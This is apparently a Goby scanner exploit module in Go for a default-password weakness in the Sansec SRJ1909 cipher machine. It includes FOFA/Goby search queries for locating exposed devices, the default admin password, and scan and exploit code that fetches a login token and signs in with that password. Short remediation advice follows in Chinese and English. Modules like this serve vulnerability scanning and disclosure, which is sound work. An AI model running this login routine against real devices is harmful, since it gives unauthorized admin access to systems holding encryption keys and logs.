package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Sanwei Xin'an SRJ1909 device default password vulnerability",
    "Description": "<p>Sanwei Xinan server cipher machine is a high-performance cipher device independently developed by Sanwei Xinan Technology Co., Ltd. It can meet the requirements of signature/verification, encryption/decryption of application system data, ensure the confidentiality, integrity and validity of the transmitted information, and provide a safe and perfect key management mechanism. The model SRJ1909 has a default password.</p>",
    "Product": "sansec SRJ1909",
    "Homepage": "https://www.sansec.com.cn/product/57.html",
    "DisclosureDate": "2023-02-25",
    "Author": "小火车",
    "FofaQuery": "header=\"sansec\"&&body=\"密码\"",
    "GobyQuery": "header=\"sansec\"&&body=\"密码\"",
    "Level": "1",
    "Impact": "<p>SRJ1909 cipher machine has a default password, which can be used by attackers swxa@1234 Log in to the system background to view the relevant encryption keys and log traffic</p>",
    "Recommendation": "<p>1. There is no detailed solution available at present, please pay attention to the update of the manufacturer's homepage: <a href=\"https://www.sansec.com.cn.\">https://www.sansec.com.cn.</a></p><p>2. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p><p>4. Set access policies through security devices such as firewalls, and set whitelist access.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/LoginServlet?method=getToken",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"status\":\"success\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|\"token\":\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/LoginServlet?method=login",
                "follow_redirect": true,
                "header": {
                    "token": "{{{token}}}",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "language=ZH&password=swxa%401234"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "登录成功",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "status\":\"success\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/LoginServlet?method=getToken",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"status\":\"success\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|\"token\":\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/LoginServlet?method=login",
                "follow_redirect": true,
                "header": {
                    "token": "{{{token}}}",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "language=ZH&password=swxa%401234"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "登录成功",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|登陆密码：swxa@1234"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "三未信安 SRJ1909 设备默认密码漏洞",
            "Product": "三未信安SRJ1909密码机",
            "Description": "<p>三未信安服务器密码机是由三未信安科技股份有限公司自主研发的高性能密码设备，可以满足应用系统数据的签名/验证、加密/解密的要求，保证传输信息的机密性、完整性和有效性，同时提供安全、完善的密钥管理机制，型号SRJ1909存在默认口令漏洞。</p><p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.sansec.com.cn\">https://www.sansec.com.cn</a>。</p><p>2、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>3、如非必要，禁止公网访问该系统。&nbsp;</p><p>4、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>SRJ1909密码机存在默认密码，攻击者可利用默认口令swxa@1234 登录系统后台，查看相关加密密钥以及日志流量。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Sanwei Xin'an SRJ1909 device default password vulnerability",
            "Product": "sansec SRJ1909",
            "Description": "<p>Sanwei Xinan server cipher machine is a high-performance cipher device independently developed by Sanwei Xinan Technology Co., Ltd. It can meet the requirements of signature/verification, encryption/decryption of application system data, ensure the confidentiality, integrity and validity of the transmitted information, and provide a safe and perfect key management mechanism. The model SRJ1909 has a default password.<br></p>",
            "Recommendation": "<p>1. There is no detailed solution available at present, please pay attention to the update of the manufacturer's homepage: <a href=\"https://www.sansec.com.cn.\">https://www.sansec.com.cn.</a></p><p>2. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p><p>4. Set access policies through security devices such as firewalls, and set whitelist access.</p>",
            "Impact": "<p>SRJ1909 cipher machine has a default password, which can be used by attackers swxa@1234 Log in to the system background to view the relevant encryption keys and log traffic</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-02",
    "PocId": "10812"
}`
	doHttp32831902 := func(hostInfo *httpclient.FixUrl, url, httpType, token string) (*httpclient.HttpResponse, error) {
		var cfg *httpclient.RequestConfig
		if httpType == "post" {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Header.Store("token", token)
			cfg.Header.Store("Accept", "application/json, text/javascript, */*; q=0.01")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg.Data = "language=ZH&password=swxa%401234"

		} else {
			cfg = httpclient.NewGetRequestConfig(url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
		}

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return resp, err
		}
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := doHttp32831902(hostInfo, "/LoginServlet?method=getToken", "get", "")
			if err != nil {
				return false
			}
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"status\":\"success\"") {
				pattern := `"token":"(.*?)"`
				re := regexp.MustCompile(pattern)
				if match := re.FindStringSubmatch(resp.RawBody); len(match) > 1 {
					token := match[1]
					resp, err := doHttp32831902(hostInfo, "/LoginServlet?method=login", "post", token)
					if err != nil {
						return false
					}
					return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "登录成功")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, err := doHttp32831902(expResult.HostInfo, "/LoginServlet?method=getToken", "get", "")
			if err != nil {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
			}
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"status\":\"success\"") {
				pattern := `"token":"(.*?)"`
				re := regexp.MustCompile(pattern)
				if match := re.FindStringSubmatch(resp.RawBody); len(match) > 1 {
					token := match[1]
					resp, err := doHttp32831902(expResult.HostInfo, "/LoginServlet?method=login", "post", token)
					if err != nil {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					}
					if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "登录成功") {
						expResult.Success = true
						expResult.Output = "漏洞利用成功\n"
						expResult.Output += "登录密码：swxa@1234"
					}
				}
			}
			return expResult
		},
	))
}
